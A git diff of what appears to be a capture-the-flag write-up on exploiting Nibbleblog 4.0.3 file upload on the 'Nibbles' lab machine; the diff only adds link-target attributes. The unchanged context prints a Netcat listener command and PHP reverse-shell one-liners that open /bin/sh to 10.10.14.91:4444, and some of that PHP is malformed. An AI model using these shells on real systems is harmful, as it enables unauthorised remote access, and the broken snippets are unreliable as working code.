@@ -52,7 +52,7 @@ Fortunately, these credentials worked, even though they are not the default cred
 
 Our next step is to explore the admin features to identify one that allows us to upload a shell. Since it is a PHP application running on Apache, I opted to use a PHP shell.
 
-I began by using the `searchsploit` tool to search Exploit-DB for any Nibbleblog exploits. I found `38489.rb`. Checking the [Exploit-DB page](https://www.exploit-db.com/exploits/38489), I found the author's blog post.
+I began by using the `searchsploit` tool to search Exploit-DB for any Nibbleblog exploits. I found `38489.rb`. Checking the [Exploit-DB page](https://www.exploit-db.com/exploits/38489){:target="_blank"}, I found the author's blog post.
 
 ```shell
 kali@kali:~/Documents/Notes/CTF/Machines/nibbles$ searchsploit nibbleblog
@@ -61,7 +61,7 @@ Nibbleblog 3 - Multiple SQL Injections | php/webapps/35865.txt
 Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
 ```
 
-The URL was no longer working, but fortunately, it was cached on the [Wayback Machine](http://web.archive.org/web/20151113152730/http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html).
+The URL was no longer working, but fortunately, it was cached on the [Wayback Machine](http://web.archive.org/web/20151113152730/http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html){:target="_blank"}.
 
 ![](https://jawad.ca/images/nibbles5.png)
 
@@ -75,13 +75,13 @@ Let's prepare our attack VM by starting a Netcat listener on port `4444`:
 kali@kali:~$ nc -lvnp 4444
 ```
 
-We prepare a PHP shell using the [GTFO](https://gtfobins.github.io/gtfobins/php/#reverse-shell) cheat sheet:
+We prepare a PHP shell using the [GTFO](https://gtfobins.github.io/gtfobins/php/#reverse-shell){:target="_blank"} cheat sheet:
 
 ```shell
 php -r '$sock=fsockopen(getenv("10.10.14.91"),getenv("4444"));exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-We then create a PHP file that leverages the [PHP system function](https://www.php.net/manual/en/function.system.php). This might not work if the `php.ini` configuration restricts it, but we give it a try:
+We then create a PHP file that leverages the [PHP system function](https://www.php.net/manual/en/function.system.php){:target="_blank"}. This might not work if the `php.ini` configuration restricts it, but we give it a try:
 
 ```php
 <?php system(php -r '$sock=fsockopen(getenv("10.10.14.91"),getenv("4444"));exec("/bin/sh -i <&3 >&3 2>&3");'); ?>
@@ -95,7 +95,7 @@ After uploading the `shell.php` file under the "My Image" plugin page, I was una
 
 We could use Metasploit to automate the exploit, but exploiting it manually is a better learning exercise.
 
-Next, we try another reverse shell code using [revshells](https://www.revshells.com/).
+Next, we try another reverse shell code using [revshells](https://www.revshells.com/){:target="_blank"}.
 
 ![](https://jawad.ca/images/nibbles7.png)
 
